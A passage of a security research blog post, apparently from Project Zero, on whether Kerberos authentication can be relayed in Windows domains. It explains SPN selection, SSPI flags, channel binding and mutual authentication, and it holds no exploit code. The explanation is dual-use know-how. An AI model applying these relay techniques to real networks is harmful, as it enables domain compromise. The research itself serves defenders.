5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:164.2pt;border-top-color:#000000;border-bottom-style:solid}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c26{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c31{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c32{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c39{-webkit-text-decoration-skip:none;color:#000000;text-decoration:line-through;vertical-align:baseline;text-decoration-skip-ink:none;font-style:normal}.c38{color:#000000;text-decoration:none;vertical-align:super;font-style:normal}.c21{border-spacing:0;border-collapse:collapse;margin-right:auto}.c7{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c6{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c8{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c25{font-weight:400;font-size:11pt;font-family:"Arial"}.c37{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c19{font-weight:400;font-size:16pt;font-family:"Arial"}.c2{font-size:10pt;font-family:"Courier New";font-weight:400}.c12{font-weight:400;font-size:11pt;font-family:"Courier New"}.c40{font-weight:400;font-size:10pt;font-family:"Arial"}.c14{color:#000000;text-decoration:none;vertical-align:baseline}.c42{font-family:"Courier New";font-weight:400}.c16{border:1px solid black;margin:5px}.c18{margin-left:36pt;padding-left:0pt}.c5{color:inherit;text-decoration:inherit}.c24{padding:0;margin:0}.c28{background-color:#ffff00}.c33{background-color:#cccccc}.c9{height:11pt}.c17{color:#696969}.c34{color:#000080}.c4{font-style:italic}.c13{color:#0000ff}.c35{color:#8a2be2}.c36{color:#a31515}.c23{color:#a82d00}.c20{height:0pt}.c41{vertical-align:super}.c27{color:#8b0000}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c37"&gt;&lt;div&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This blog post is a summary of some research I&amp;#39;ve been doing into relaying Kerberos authentication in Windows domain environments. To keep this blog shorter I am going to assume you have a working knowledge of Windows network authentication, and specifically Kerberos and NTLM. For a quick primer on Kerberos see &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13"&gt;this page&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is part of Microsoft&amp;#39;s Kerberos extension documentation or you can always read &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://www.rfc-editor.org/rfc/rfc4120.txt"&gt;RFC4120&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.yuh7isexpwgo"&gt;&lt;span class="c6 c19"&gt;Background&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;Windows based enterprise networks rely on network authentication protocols, such as &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4"&gt;NT Lan Manager (NTLM)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and Kerberos to implement single sign on. These protocols allow domain users to seamlessly connect to corporate resources without having to repeatedly enter their passwords. This works by the computer&amp;#39;s &lt;/span&gt;&lt;span class="c4"&gt;Local Security Authority (LSA)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;process storing the user&amp;#39;s credentials when the user first authenticates. The LSA can then reuse those credentials for network authentication without requiring user interaction.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;However, the convenience of not prompting the user for their credentials when performing network authentication has a downside. To be most useful, common clients for network protocols such as HTTP or SMB must automatically perform the authentication without user interaction otherwise it defeats the purpose of avoiding asking the user for their credentials. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;This automatic authentication can be a problem if an attacker can trick a user into connecting to a server they control. The attacker could induce the user&amp;#39;s network client to start an authentication process and use that information to authenticate to an unrelated service allowing the attacker to access that service&amp;#39;s resources as the user. When the authentication protocol is captured and forwarded to another system in this way it&amp;#39;s referred to as an Authentication Relay attack.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c25 c14 c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s856" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s856" border="0" alt="Simple diagram of an authentication relay attack" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Authentication relay attacks using the NTLM protocol were &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://web.archive.org/web/20030706050349/http://www.xfocus.net/articles/200305/smbrelay.html"&gt;f&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://web.archive.org/web/20030706050349/http://www.xfocus.net/articles/200305/smbrelay.html"&gt;irst published&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;all the way back in 2001 by Josh Buchbinder (Sir Dystic) of the Cult of the Dead Cow&lt;/span&gt;&lt;span&gt;. However, even in 2021 NTLM relay attacks still represent a threat in default configurations of Windows domain networks. The most recent major abuse of NTLM relay was through the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://specterops.io/assets/resources/Certified_Pre-Owned.pdf"&gt;Active Directory Certificate Services web enrollment service&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This combined with the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/topotam/PetitPotam"&gt;PetitPotam&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;technique to induce a Domain Controller to perform NTLM authentication allows for a Windows domain to be compromised by an unauthenticated attacker.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Over the years Microsoft has made many efforts to mitigate authentication relay attacks. The best mitigations rely on the fact that the attacker does not have knowledge of the user&amp;#39;s password or control over the authentication process. This includes signing and encryption (sealing) of network traffic using a session key which is protected by the user&amp;#39;s password or channel binding as part of &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/"&gt;Extended Protection for Authentication (EPA)&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;which prevents relay of authentication to a network protocol under TLS.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Another mitigation regularly proposed is to disable NTLM authentication either for particular services or network wide using &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain"&gt;Group Policy&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;. While this has potential compatibility issues, restricting authentication to only Kerberos should be more secure. That got me thinking, is disabling NTLM sufficient to eliminate authentication relay attacks on Windows domains?&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.58jp1dccho9f"&gt;&lt;span class="c6 c19"&gt;Why are there no Kerberos Relay Attacks?&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;The obvious question is, if NTLM is disabled could you relay Kerberos authentication instead? Searching for Kerberos Relay attacks doesn&amp;#39;t yield much public research that I could find. There is the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/dirkjanm/krbrelayx"&gt;krbrelayx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;tool written by &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://twitter.com/_dirkjan"&gt;Dirk-jan&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is similar in concept to the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx"&gt;ntlmrelayx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;tool in &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/SecureAuthCorp/impacket"&gt;impacket&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a common tool for performing NTLM authentication relay attacks&lt;/span&gt;&lt;span&gt;. However as the accompanying &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;makes clear this is a tool to abuse &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/defender-for-identity/cas-isp-unconstrained-kerberos"&gt;unconstrained delegation&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;rather than relay the authentication. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;I did find a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf"&gt;recent presentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;by Sagi Sheinfeld, &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://twitter.com/eyal_karni"&gt;Eyal Karni&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://twitter.com/YaronZi"&gt;Yaron Zinar&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from Crowdstrike at Defcon 29 (and also coming up at Blackhat EU 2021) which relayed Kerberos authentication. The presentation discussed MitM network traffic to specific servers, then relaying the Kerberos authentication. A MitM attack relies on being able to spoof an existing server through some mechanism, which is a well known risk. &amp;nbsp;The last line in the presentation is &lt;/span&gt;&lt;span class="c4"&gt;&amp;quot;Microsoft Recommendation: Avoid being MITM&amp;rsquo;d&amp;hellip;&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which seems a &lt;/span&gt;&lt;span&gt;reasonable approach to take if possible&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;However a MitM attack is slightly different to the common NTLM relay attack scenario where you can induce a domain joined system to authenticate to a server an attacker controls and then forward that authentication to an unrelated service. NTLM is easy to relay as it wasn&amp;#39;t designed to distinguish authentication to a particular service from any other. The only unique aspect was the server (and later client) challenge but that value wasn&amp;#39;t specific to the service and so authentication for say SMB could be forwarded to HTTP and the victim service couldn&amp;#39;t tell the difference. Subsequently EPA has been retrofitted onto NTLM to make the authentication specific to a service, but due to backwards compatibility these mitigations aren&amp;#39;t always used.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;On the other hand Kerberos has always required the target of the authentication to be specified beforehand through a &lt;/span&gt;&lt;span class="c4"&gt;principal name&lt;/span&gt;&lt;span&gt;, typically this is a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names"&gt;Service Principal Name (SPN)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;although in certain circumstances it can be a &lt;/span&gt;&lt;span class="c4"&gt;User Principal Name (UPN)&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The SPN is usually represented as a string of the form &lt;/span&gt;&lt;span class="c4"&gt;CLASS/INSTANCE:PORT/NAME&lt;/span&gt;&lt;span&gt;, where &lt;/span&gt;&lt;span class="c4"&gt;CLASS&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the class of service, such as &lt;/span&gt;&lt;span class="c4"&gt;HTTP&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c4"&gt;CIFS&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c4"&gt;INSTANCE &lt;/span&gt;&lt;span&gt;is typically the DNS name of the server hosting the service and &lt;/span&gt;&lt;span class="c4"&gt;PORT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;NAME&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;are optional.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The SPN is used by the Kerberos &lt;/span&gt;&lt;span class="c4"&gt;Ticket Granting Server (TGS)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to select the shared encryption key for a Kerberos service ticket generated for the authentication. This ticket contains the details of the authenticating user based on the contents of the &lt;/span&gt;&lt;span class="c4"&gt;Ticket Granting Ticket (TGT)&lt;/span&gt;&lt;span&gt;&amp;nbsp;that was requested during the user&amp;#39;s initial Kerberos authentication process. The client can then package the service&amp;#39;s ticket into an &lt;/span&gt;&lt;span class="c4"&gt;Authentication Protocol Request (AP_REQ)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;authentication token to send to the server.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Without knowledge of the shared encryption key the Kerberos service ticket can&amp;#39;t be decrypted by the service and the authentication fails. Therefore if Kerberos authentication is attempted to an SMB service with the SPN &lt;/span&gt;&lt;span class="c4"&gt;CIFS/fileserver.domain.com&lt;/span&gt;&lt;span&gt;, then that ticket shouldn&amp;#39;t be usable if the relay target is a HTTP service with the SPN &lt;/span&gt;&lt;span class="c4"&gt;HTTP/fileserver.domain.com&lt;/span&gt;&lt;span&gt;, as the shared key should be different.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;In practice that&amp;#39;s rarely the case in Windows domain networks. The Domain Controller associates the SPN with a user account, most commonly the computer account of the domain joined server and the key is derived from the account&amp;#39;s password. The &lt;/span&gt;&lt;span class="c4"&gt;CIFS/fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;HTTP/fileserver.domain.com &lt;/span&gt;&lt;span&gt;SPNs would likely be assigned to the &lt;/span&gt;&lt;span class="c4"&gt;FILESERVER$&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;computer account, therefore the shared encryption key will be the same for both SPNs and in theory the authentication could be relayed from one service to the other. The receiving service could query for the authenticated SPN string from the authentication APIs and then compare it to its expected value, but this check is typically optional.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The selection of the SPN to use for the Kerberos authentication is typically defined by the target server&amp;#39;s host name. In a relay attack the attacker&amp;#39;s server will not be the same as the target. For example, the SMB connection might be targeting the attacker&amp;#39;s server, and will assign the SPN &lt;/span&gt;&lt;span class="c4"&gt;CIFS/evil.com&lt;/span&gt;&lt;span&gt;. Assuming this SPN is even registered it would in all probability have a different shared encryption key to the &lt;/span&gt;&lt;span class="c4"&gt;CIFS/fileserver.domain.com &lt;/span&gt;&lt;span&gt;SPN due to the different computer accounts. Therefore relaying the authentication to the target SMB service will fail as the ticket can&amp;#39;t be decrypted.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;The requirement that the SPN is associated with the target service&amp;#39;s shared encryption key is why I assume few consider Kerberos relay attacks to be a major risk, if not impossible. There&amp;#39;s an assumption that an attacker cannot induce a client into generating a service ticket for an SPN which differs from the host the client is connecting to.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;However, there&amp;#39;s nothing inherently stopping Kerberos authentication being relayed if the attacker can control the SPN. The only way to stop relayed Kerberos authentication is for the service to protect itself through the use of signing/sealing or channel binding which rely on the shared knowledge between the client and server, but crucially not the attacker relaying the authentication. However, even now these service protections aren&amp;#39;t the default even on critical protocols such as LDAP.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;As the only limit on basic Kerberos relay (in the absence of service protections) is the selection of the SPN, this research focuses on how common protocols select the SPN and whether it can be influenced by the attacker to achieve Kerberos authentication relay.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.8vjgkoldr6oj"&gt;&lt;span class="c6 c19"&gt;Kerberos Relay Requirements&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;It&amp;#39;s easy to demonstrate in a controlled environment that Kerberos relay is possible. We can write a simple client which uses the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://en.wikipedia.org/wiki/Security_Support_Provider_Interface"&gt;Security Support Provider Interface (SSPI)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;APIs to communicate with the LSA and implement the network authentication. This client calls the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initializesecuritycontextw"&gt;InitializeSecurityContext&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;API which will generate an AP_REQ authentication token containing a Kerberos Service Ticket for an arbitrary SPN. This AP_REQ can be forwarded to an intermediate server and then relayed to the service the SPN represents. You&amp;#39;ll find this will work, again to reiterate, assuming that no service protections are in place.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;However, there are some caveats in the way a client calls &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;which will impact how useful the generated AP_REQ is even if the attacker can influence the SPN. If the client specifies any one of the following request flags, &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_CONFIDENTIALITY,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_INTEGRITY&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_REPLAY_DETECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_SEQUENCE_DETECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;then the generated AP_REQ will enable encryption and/or integrity checking. When the AP_REQ is received by the server using the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acceptsecuritycontext"&gt;AcceptSecurityContext&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;API it will return a set of flags which indicate if the client enabled encryption or integrity checking. Some services use these &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/context-requirements"&gt;returned flags&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;to opportunistically enable service protections. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;For example LDAP&amp;#39;s default setting is to enable signing/encryption if the client supports it. Therefore you shouldn&amp;#39;t be able to relay Kerberos authentication to LDAP if the client enabled any of these protections. However, other services such as HTTP don&amp;#39;t typically support signing and sealing and so will happily accept authentication tokens which specify the request flags.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Another caveat is the client could specify channel binding information, typically derived from the certificate used by the TLS channel used in the communication. The channel binding information can be controlled by the attacker, but not set to arbitrary values without a bug in the TLS implementation or the code which determines the channel binding information itself. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;While services have an option to only enable channel binding if it&amp;#39;s supported by the client, all Windows Kerberos AP_REQ tokens indicate support through the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b15648e2-439a-4d04-b8a2-2f34c45690f9"&gt;KERB_AP_OPTIONS_CBT&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;options flag in the authenticator. &lt;/span&gt;&lt;span&gt;Sagi Sheinfeld et al did demonstrate (see slide 22 in &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf"&gt;their presentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;that if you can get the AP_REQ from a non-Windows source it will not set the options flag and so no channel binding is enforced, but that was apparently not something Microsoft will fix. It is also possible that a Windows client disables channel binding through a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/authentication-fails-non-windows-ntlm-kerberos-server"&gt;registry configuration option&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;, although that seems to be unlikely in real world networks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;If the client specifies the &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_MUTUAL_AUTH&lt;/span&gt;&lt;span&gt;&amp;nbsp;request flag when generating the initial AP_REQ it will enable mutual authentication between the client and server. The client expects to receive an &lt;/span&gt;&lt;span class="c4"&gt;Authentication Protocol Response (AP_REP)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;token from the server after sending the AP_REQ to prove it has possession of the shared encryption key. If the server doesn&amp;#39;t return a valid AP_REP the client can assume it&amp;#39;s a spoofed server and refuse to continue the communication. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;From a relay perspective, mutual authentication doesn&amp;#39;t really matter as the server is the target of the relay attack, not the client. The target server will assume the authentication has completed once it&amp;#39;s accepted the AP_REQ, so that&amp;#39;s all the attacker needs to forward. While the server will generate the AP_REP and return it to the attacker they can just drop it unless they need the relayed client to continue to participate in the communication for some reason.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One final consideration is that the SSPI APIs have two security packages which can be used to implement Kerberos authentication, &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;Kerberos&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;protocol wraps the AP_REQ (and other authentication tokens) in the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4178"&gt;SPNEGO protocol&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;whereas &lt;/span&gt;&lt;span class="c4"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends the authentication tokens using a simple GSS-API wrapper (see &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4121"&gt;RFC4121&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;). &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The first potential issue is &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;is by far the most likely package in use as it allows a network protocol the flexibility to use the most appropriate authentication protocol that the client and server both support. However, what happens if the client uses the raw &lt;/span&gt;&lt;span class="c4"&gt;Kerberos &lt;/span&gt;&lt;span&gt;package but the server uses &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span class="c3"&gt;? &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span 